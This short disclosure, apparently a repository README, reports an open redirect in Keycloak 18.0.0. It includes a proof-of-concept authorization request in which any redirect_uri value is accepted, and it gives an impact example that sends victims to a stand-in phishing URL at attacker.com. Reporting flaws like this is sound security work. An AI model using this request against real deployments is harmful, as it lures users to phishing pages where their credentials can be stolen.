# OpenRedirect-Keycloak18.0.0
An open redirection vulnerability (open redirect) happens when attackers are able to control where a website or application redirects users. Here in this case, we can mention any URL as value of redirect_uri and it successfully redirects to it.

POC. /auth/realms/master/protocol/openid-connect/auth?client_id=<id>&redirect_uri=<ANY_REDIRECT_URL>&state=72526a4b-d5b6-4424-90db-cc0f7c2001a7&response_mode=fragment&response_type=code&scope=openid&nonce=33e890be-c19f-463f-bd0e-7fdcd065c0fb HTTP/2


**Impact.** By exploiting the open redirect vulnerability on the keycloak using the URL parameter value 'redirect_uri', the attacker is redirecting the victim to http://attacker.com/phish
